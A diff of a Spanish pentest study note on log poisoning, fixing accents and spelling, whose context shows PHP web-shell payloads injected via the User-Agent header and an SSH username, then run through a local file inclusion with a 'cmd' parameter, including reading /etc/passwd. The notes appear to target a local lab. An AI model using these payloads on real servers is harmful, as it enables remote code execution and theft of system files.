@@ -19,7 +19,7 @@ Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el
 
 ## HTML Apache
 
-Debemos de etare en el grupo **adm** y nos podemos ir a la siguiente ruta para mirar logs
+Debemos de estar en el grupo **adm** y nos podemos ir a la siguiente ruta para mirar logs
 ```bash
 /var/log
 ```
@@ -28,10 +28,10 @@ Debemos de etare en el grupo **adm** y nos podemos ir a la siguiente ruta para m
 ❯ cat access.log       # Podemos ver los logs en Apache
 ```
 
-* **index.php?filename=/var/log/apache2/access.log** -> Ruta tipica de logs de Apache en donde podemos ver los logs, incluyendo los del User Agent ('Mozilla/5.0 (Windows NT...)')
-**User Agent**: Es un campo del protocolo HTTP que puede utilizarse para transmitir informacion mas o menos detallada sobre el dispositivo de consulta que tramita la solicitud
+* **index.php?filename=/var/log/apache2/access.log** -> Ruta típica de logs de Apache en donde podemos ver los logs, incluyendo los del User Agent ('Mozilla/5.0 (Windows NT...)')
+**User Agent**: Es un campo del protocolo HTTP que puede utilizarse para transmitir información mas o menos detallada sobre el dispositivo de consulta que tramita la solicitud
 
-Podemos hacer la solicitud a la pagina y mirar en los log el User-Agent y la peticion que hicimos
+Podemos hacer la solicitud a la pagina y mirar en los log el User-Agent y la petición que hicimos
 ```bash
 ❯ curl -s -X GET "http://localhost/test" -H "User-Agent: PROBANDO"
 
@@ -42,22 +42,22 @@ Podemos hacer la solicitud a la pagina y mirar en los log el User-Agent y la pet
 Podemos inyectar comandos si estamos en una pagina en PHP
 **Nota**: La funcion System debe de estar habilitada
 
-Para saber si hay funciones desabilitadas
+Para saber si hay funciones deshabilitadas
 ```bash
 ❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php phpinfo(); ?>"   # Miras el phpinfo en la web y nos fijamos en 'disable_functions' para verificar que no este system ahi 
 ```
 
-Podemos ejecutar comandos especificos 
+Podemos ejecutar comandos específicos 
 ```bash
 ❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system('whoami'); ?>"
 ```
 
-Podemos controlar la ejecucion del comando
+Podemos controlar la ejecución del comando
 ```bash
 ❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"     # Escapamos el dollar porque en bash a veces genera conflictos
 ```
 * index.php?filename=/var/log/apache2/access.log&cmd=whoami
-Debemos de colocar al final **&cmd=comando** y es ahi donde podriamos colocar cualquier comando 
+Debemos de colocar al final **&cmd=comando** y es ahí donde podríamos colocar cualquier comando 
 
 ## SSH
 
@@ -81,6 +81,6 @@ Nosotros podemos controlar el log que es del usuario
 ```bash
 ❯ ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2
 ```
-Por ende en la url podemos controlar la ejecucion del comando, si ese archivo tiene capacidad de escritura
+Por ende en la url podemos controlar la ejecución del comando, si ese archivo tiene capacidad de escritura
 * index.php?filename=/var/log/btmp&cmd=cat /etc/passwd
-Debemos de colocar al final **&cmd=comando** y es ahi donde podriamos colocar cualquier comando 
+Debemos de colocar al final **&cmd=comando** y es ahí donde podríamos colocar cualquier comando 
